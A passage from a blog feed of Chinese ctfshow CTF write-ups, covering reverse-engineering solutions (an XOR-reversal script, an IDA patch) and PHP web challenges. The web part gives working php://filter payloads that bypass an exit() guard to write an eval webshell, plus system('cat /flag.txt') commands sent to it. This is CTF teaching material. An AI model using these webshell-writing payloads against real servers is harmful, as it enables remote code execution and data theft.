punctuation\">}</span></pre></td></tr></tbody></table></figure><p>大致为每次两位字符与已知的 a <code>V4pY59</code>  进行比较 (这里有个应该注意的点，v2 初始值为 0，第一位比较的索引为 - 1，查看汇编代码，aV4pY59 前一位地址对应的字符为 <code>/</code> )</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5Creverse%5C%E9%80%86%E5%90%914_1.jpg\" alt=\"\"></p>\n<p>因此，最终比较的字符串为 <code>/..v4p$$!&gt;Y59-</code></p>\n<p>当相等后，会返回认证成功</p>\n<p>由此，对此验证过程进行逆向</p>\n<p>首先获取由输入值得到的字符串，因为异或后比较的字符串为 <code>/..v4p$$!&gt;Y59-</code> , 根据异或的性质，再进行一次异或即可得到由输入值得到的字符串，即</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>aV4pY59 <span class=\"token operator\">=</span> <span class=\"token string\">\"/..v4p$$!&gt;Y59-\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> aV4pY59<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token builtin\">cmp</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p><code>cmp</code>  即为所求</p>\n<p>cmp 的每一位字符在 <code>a4890572163qwe</code>  中的索引值即为每次求得的模值 (或者可以看作 26 进制的每一位)</p>\n<p>故还原代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>a4890572163qwe <span class=\"token operator\">=</span> <span class=\"token string\">\")(*&amp;^%489$!057@#&gt;&lt;:2163qwe\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    index <span class=\"token operator\">=</span> a4890572163qwe<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">*</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> index</pre></td></tr></tbody></table></figure><p>综上，完整代码为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>aV4pY59 <span class=\"token operator\">=</span> <span class=\"token string\">\"/..v4p$$!&gt;Y59-\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a4890572163qwe <span class=\"token operator\">=</span> <span class=\"token string\">\")(*&amp;^%489$!057@#&gt;&lt;:2163qwe\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin\">cmp</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> aV4pY59<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">cmp</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    index <span class=\"token operator\">=</span> a4890572163qwe<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">*</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> index</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>得到 <code>2484524302484524302</code></p>\n<p>打开程序，输入该数字，返回 <code>认证成功</code> ，因此 flag 为 <code>flag{2484524302484524302}</code></p>\n<h2 id=\"逆向5\"><a class=\"anchor\" href=\"#逆向5\">#</a> 逆向 5</h2>\n<p>打开，反汇编</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">sub_4020B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">sub_4015BD</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>dword_405020 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">MessageBoxA</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>跟进 <code>sub_4015BD</code></p>\n<p>得到</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>__stdcall <span class=\"token function\">sub_4015BD</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>retaddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+24h] [ebp+4h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span>Str<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> Str<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> sub_401520<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    retaddr <span class=\"token operator\">=</span> sub_401520<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>跟进 sub_401520</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">sub_401520</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FARPROC H<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+14h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  HMODULE hModule<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+18h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  size_t i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+1Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  hModule <span class=\"token operator\">=</span> <span class=\"token function\">LoadLibraryA</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.dll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  H <span class=\"token operator\">=</span> <span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span>hModule<span class=\"token punctuation\">,</span> <span class=\"token string\">\"H\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>__cdecl <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>H<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a12345678901111<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_40163E</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以猜测到为 flag 的输出</p>\n<p>故需要进入 <code>sub_4015BD</code>  判断里，从而运行输出 flag 的函数</p>\n<p>利用 IDA，找到要修改的汇编语句，Edit -&gt; Patch program -&gt; Assemble,</p>\n<p>由于 Str [1] = \"b\" (由语句 <code>.data:00403020 Str             db 'dba54edb0?d6&gt;7??3ef0f1caf2ad3102',0</code>  获知)</p>\n<p>故要通过判断，则应该与 \"b\" 相比</p>\n<pre><code class=\"language-assembly\">.text:004015CA                 cmp     al, 1\n;修改为\n.text:004015CA                 cmp     al, 62h ; 'b'\n</code></pre>\n<p>修改好后，Edit -&gt; Patch program -&gt; Apply patches to input file</p>\n<p>之后运行覆盖的 <code>exe</code>  文件，得到 flag</p>\n<p><code>cef23bce78c190884ba7a6dfa5fc4675</code></p>\n<p>即 <code>flag{cef23bce78c190884ba7a6dfa5fc4675}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/25b29fe5/",
            "url": "http://dpm12345.cn/posts/25b29fe5/",
            "title": "新春欢乐赛_2022",
            "date_published": "2022-10-04T03:07:26.000Z",
            "content_html": "<h1 id=\"热身\"><a href=\"#热身\" class=\"headerlink\" title=\"热身\"></a>热身</h1><p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接 phpinfo 搜 append 可以看到包含的文件，查看之得到 flag </p>\n<p>涉及到：<code>phpinfo()</code>,<code>append </code></p>\n<p><strong>phpinfo():</strong> 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息 (License)。</p>\n<h1 id=\"Web-1\"><a href=\"#Web-1\" class=\"headerlink\" title=\"Web 1\"></a>Web 1</h1><p>对 <code>file_put_contents($content,'&lt;?php exit();'.$content);</code>的绕过</p>\n<p>在这里，由于将 <code>exit();</code> 写入了文件，那么即使成功传入一句话木马，也无法执行，那么需要绕过 <code>exit()</code></p>\n<h2 id=\"绕过方法\"><a href=\"#绕过方法\" class=\"headerlink\" title=\"绕过方法\"></a>绕过方法</h2><h3 id=\"Round-1\"><a href=\"#Round-1\" class=\"headerlink\" title=\"Round 1\"></a>Round 1</h3><pre><code class=\"php\">&lt;?php\n$content = '&lt;?php exit; ?&gt;';\n$content .= $_POST['txt'];\nfile_put_contents($_POST['filename'], $content);\n</code></pre>\n<p><code>$content</code> 在开头增加了 <code>exit</code> 过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的</p>\n<p><code>$_POST['filename']</code> 是可以控制协议的，我们即可使用 <code>php://filter</code> 协议来施展魔法</p>\n<h4 id=\"方法一、base64-编码\"><a href=\"#方法一、base64-编码\" class=\"headerlink\" title=\"方法一、base64 编码\"></a>方法一、base64 编码</h4><p>使用<code>php://filter</code>流的<code>base64-decode</code>方法，将<code>$content</code>解码，利用<code>php base64_decode </code>函数特性去除 “死亡 exit”。</p>\n<p>众所周知，base64编码中只包含64个可打印字符<code>（A-Z a-z 0-9 + /）'='</code> 补位，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit;?&gt;</code>后，我们可以使用<code>php://filter/write=convert.base64-decode</code>来首先对其解码。在解码的过程中，字符<code> &lt;、?、;、&gt;、空格</code>等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有 “phpexit” 和我们传入的其他字符。</p>\n<p>“phpexit” 一共 7 个字符，<strong>因为 base64 算法解码时是4个byte一组</strong>，所以给他增加1个“a”一共 8 个字符。这样，”phpexita” 被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是  没有了。</p>\n<p>最终效果:</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png\"></p>\n<h4 id=\"方法二、利用字符串操作方法-base64-组合拳\"><a href=\"#方法二、利用字符串操作方法-base64-组合拳\" class=\"headerlink\" title=\"方法二、利用字符串操作方法 + base64 组合拳\"></a>方法二、利用字符串操作方法 + base64 组合拳</h4><p>除了使用base64特性的方法外，我们还可以利用<code>php://filter</code>字符串处理方法来去除“死亡 exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>\n<p>这实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>编写如下测试代码即可查看<code>php://filter/read=string.strip_tags/resource=php://input</code>的效果：</p>\n<pre><code class=\"php\">echo readfile('php://filter/read=string.strip_tags/resource=php://input');\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png\"></p>\n<p>可见，<code>?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用<code>strip_tags</code>同样会被去除。</p>\n<p>万幸的是，<code>php://filter</code>允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成<code>strip_tags</code>后再进行<code>base64-decode</code>。“死亡 exit” 在第一步被去除，而 webshell 在第二步被还原。</p>\n<p>最终效果：</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_3.png\"></p>\n<h4 id=\"方法三、ROT13-编码\"><a href=\"#方法三、ROT13-编码\" class=\"headerlink\" title=\"方法三、ROT13 编码\"></a>方法三、ROT13 编码</h4><p>原理和上面类似，核心是将 “死亡 exit” 去除。<code>&lt;?php exit; ?&gt;</code>在经过 rot13 编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code></p>\n<p>在PHP不开启<code>short_open_tag</code> 时，php 不认识这个字符串，当然也就不会执行了</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_4.png\"></p>\n<h3 id=\"Round-2\"><a href=\"#Round-2\" class=\"headerlink\" title=\"Round 2\"></a>Round 2</h3><pre><code class=\"php\">&lt;?php\n$a = $_POST['txt'];\nfile_put_contents($a,\"&lt;?php exit();\".$a);\n</code></pre>\n<p>这种是前后两个变量相同，假设<code>$a</code>可控情况。</p>\n<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些。</p>\n<h4 id=\"方法一、base64-编码-1\"><a href=\"#方法一、base64-编码-1\" class=\"headerlink\" title=\"方法一、base64 编码\"></a>方法一、base64 编码</h4><p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用<code>php://filter</code>来构造，反正后面是写入的内容，只要在后面解码的时候把 shell 解码出来，不需要的东西解码成乱码即可，而 Base64 构造的话，例如</p>\n<pre><code class=\"php\">$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php\n\n（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）\n</code></pre>\n<p>构造的 shell 可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），<code>php://filter</code>面对不可用的规则（一串 base64）是报个 Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是 “很完美” 的。我们看下<code>base-decode</code>哪些字符👇</p>\n<pre><code class=\"raw\">php://filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shell.php\n</code></pre>\n<p>而默认情况下 base64 编码是以<code>=</code>作为结尾的，所以正常解码的时候到了<code>=</code>就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的<code>=</code>过不掉，所以导致过滤器解码失败，从而报错…</p>\n<p>这里用 base64 编码我还没找到好的方法，待补充…</p>\n<h4 id=\"方法二、ROT13\"><a href=\"#方法二、ROT13\" class=\"headerlink\" title=\"方法二、ROT13\"></a>方法二、ROT13</h4><p>rot13 编码就不存在 base64 的问题，所以和前面 base64 构造的思路一样</p>\n<pre><code class=\"php\">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php\n</code></pre>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/web1_5.png\"></p>\n<p>和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用(默认情况是没开启的：<code>php.ini</code>中的<code>short_open_tag</code>)</p>\n<h4 id=\"方法三、iconv-字符编码转换\"><a href=\"#方法三、iconv-字符编码转换\" class=\"headerlink\" title=\"方法三、iconv 字符编码转换\"></a>方法三、iconv 字符编码转换</h4><p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式,而我们构造的转成可正常解析的</p>\n<pre><code class=\"php\">#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'&lt;?php phpinfo();?&gt;');\n?&lt;hp phpipfn(o;)&gt;?\n</code></pre>\n<p>这里用的是 UCS-2，当然我们也可以用 UCS-4</p>\n<pre><code class=\"php\">echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa&lt;?php phpinfo();?&gt;');\n?&lt;aa phpiphp(ofn&gt;?;)\n</code></pre>\n<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload</p>\n<pre><code class=\"php\">$a='php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php';\n\n**or**\n\n$a='php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php';\n#由于是 4 位一反转，所以需要保证？&lt;aa phpiphp (ofn&gt;?;) 之前字符个数是 4 的倍数，所以补充了 xxx\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png\"></p>\n<h4 id=\"方法四、iconv-字符编码转换-ROT13-编码组合拳\"><a href=\"#方法四、iconv-字符编码转换-ROT13-编码组合拳\" class=\"headerlink\" title=\"方法四、iconv 字符编码转换 + ROT13 编码组合拳\"></a>方法四、iconv 字符编码转换 + ROT13 编码组合拳</h4><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用UCS-2和rot13举一个例子吧</p>\n<pre><code class=\"php\">$a = 'php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php'\n#先将 &lt;?php phpinfo(); ?&gt; 进行rot13得到&lt;?cuc cucvasb();?&gt;\n#再对&lt;?cuc cucvasb();?&gt;进行UCS2编码转换得到?&lt;uc cucvcsa(b;)&gt;?\n#最后x 补位\n#最终得到x?&lt;uc cucvcsa(b;)&gt;?\n</code></pre>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png\"></p>\n<p>为何不用<code>string.strip_tags</code>呢？因为rot13转换的同样会被<code>strip_tags</code>方法给删除了，而UCS-2或UCS-4构造的也同样会被<code>strip_tags</code>方法给删除，这里需要找其他的编码方式进行构造。</p>\n<p><strong>rot13 payload:</strong> </p>\n<pre><code class=\"php\">?content=php://filter/write=string.rot13||/resource=shell.php\n</code></pre>\n<p>其中<code>&lt;?cuc @riny($_CBFG[pzq]);?&gt;</code>为<code>&lt;?php @eval($_post[cmd]);?&gt;</code>的rot13加密结果(<code>@</code>的作用为即使错误也执行)</p>\n<p>所以访问<code>shell.php</code>, 然后post传入<code>cmd=system('ls /');</code>, 查看源码发现有<code>flag.txt</code>，然后再post传入<code>cmd=system('cat /flag.txt');</code></p>\n<p>对于<code>system ('ls /')</code>，加斜杠即访问file system (或者说为根目录) 中的文件，不加斜杠即为当前目录下的文件</p>\n<h1 id=\"Web-2\"><a href=\"#Web-2\" class=\"headerlink\" title=\"Web 2\"></a>Web 2</h1><p>题目代码</p>\n<pre><code class=\"php\">highlight_file(__FILE__);\nsession_start();\nerror_reporting(0);\n\ninclude \"flag.php\";\n\nif(count($_POST)===1){\n        extract($_POST);\n        if (call_user_func($$$$$${key($_POST)})===\"HappyNewYear\"){\n                echo $flag;\n        }\n}\n?&gt;\n</code></pre>\n<p>一共涉及到了四个函数<code>count()</code>,<code>extracy()</code>,<code>call_user_func()</code>,<code>key()</code></p>\n<p>**count(): **计算数组中的单元数目，或对象中的属性个数</p>\n<p><strong>extract()</strong>: 从数组中将变量导入到当前的符号表</p>\n<p><strong>call_user_func():</strong> 第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。返回回调函数的返回值。</p>\n<p><strong>key()</strong>: 从关联数组中取得键名</p>\n<p>post传入<code>session_id=session_id</code></p>\n<p>cookie=<code>PHPSESSID=HappyNewYear</code></p>\n<h1 id=\"Web-3\"><a href=\"#Web-3\" class=\"headerlink\" title=\"Web 3\"></a>Web 3</h1><pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-01-16 15:42:02\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-01-24 22:14:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nhighlight_file(__FILE__);\nerror_reporting(0);\n\ninclude \"flag.php\";\n$key=  call_user_func(($_GET[1]));\n\nif($key==\"HappyNewYear\"){\n  echo $flag;\n}\n\ndie(\"虎年大吉，新春快乐！\");\n</code></pre>\n<p>弱类型比较</p>\n<p>只需解决<code>call_user_func </code>函数即可</p>\n<p>为了让后面等于，那么可以使用函数<code>session_start</code>, 返回 bool 值</p>\n<h1 id=\"Web-4\"><a href=\"#Web-4\" class=\"headerlink\" title=\"Web 4\"></a>Web 4</h1><pre><code class=\"php\">$key=  call_user_func(($_GET[1]));\nfile_put_contents($key, \"&lt;?php eval(\\$_POST[1]);?&gt;\");\n\ndie(\"虎年大吉，新春快乐！\");\n</code></pre>\n<p>1=spl_autoload_extensions</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/d2cf6418694b28cf61e50bdb9a21519dc7a123eb.png\"></p>\n<p>注册好后，先访问<code>.inc,.php</code>, 同时post命令，<code>1=system('ls');</code>, 只回显<code>index.php</code>那么访问根目录下的文件<code>1=system('ls /');</code>看到<code>f1ag.txt</code>再输入<code>1=system('cat /f1ag.txt')</code>，得到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ca4ad134f882baa5980c36c06efd2c11c51ac995.png\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7c4924dd/",
            "url": "http://dpm12345.cn/posts/7c4924dd/",
            "title": "萌新",
            "date_published": "2022-10-04T02:28:52.000Z",
